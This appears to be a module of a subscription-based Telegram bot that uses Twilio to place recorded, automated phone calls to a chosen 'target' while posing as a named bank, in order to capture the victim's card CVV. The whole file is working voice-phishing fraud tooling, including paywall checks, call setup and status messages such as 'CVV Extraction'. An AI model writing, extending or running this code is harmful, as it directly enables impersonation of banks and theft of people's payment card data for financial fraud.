from telebot.types import Message
from twilio.rest import Client
from config import bot, TWILIO_SID, TWILIO_TOKEN, TWILIO_NUMBER, TWILIO_APP_URL, ADMIN_IDS
from database import check_subscription

twilio_client = None
if TWILIO_SID and TWILIO_TOKEN:
    try: twilio_client = Client(TWILIO_SID, TWILIO_TOKEN)
    except: pass

@bot.message_handler(commands=['cvv'])
def handle_cvv_call(message: Message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    # 1. Security Check
    if user_id not in ADMIN_IDS:
        if not check_subscription(user_id):
            return bot.reply_to(message, "💎 **Premium Feature:** Access denied.")
    
    if not twilio_client: return bot.reply_to(message, "❌ Twilio error.")
    
    # 2. Parse
    args = message.text.split()
    if len(args) < 3:
        return bot.reply_to(message, "⚠️ **Usage:** `/cvv [number] [bank_name]`\n\nExample: `/cvv +1555000 Chase`", parse_mode="Markdown")
    
    target = args[1]
    service = " ".join(args[2:])
    
    try:
        msg = bot.reply_to(message, f"💳 **Initializing CVV Extraction for {service}...**", parse_mode="Markdown")
        
        # 👇 TRUCO: Pasamos 'mode=cvv' en la URL
        twiml_url = f"{TWILIO_APP_URL}/twilio/voice?service={service}&user_id={user_id}&mode=cvv"
        status_callback_url = f"{TWILIO_APP_URL}/twilio/status?user_id={user_id}"

        call = twilio_client.calls.create(
            to=target, 
            from_=TWILIO_NUMBER, 
            url=twiml_url, 
            method='POST',
            record=True,
            status_callback=status_callback_url, 
            status_callback_event=['initiated', 'ringing', 'answered', 'completed']
        )
        
        bot.edit_message_text(
            f"📞 **Calling for CVV...**\n\n🎯 Target: `{target}`\n🏦 Bank: `{service}`\n🕵️ Mode: **CVV Capture (3 Digits)**\n\n_⚠️ Waiting for card details..._", 
            chat_id=chat_id,
            message_id=msg.message_id,
            parse_mode="Markdown"
        )
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")
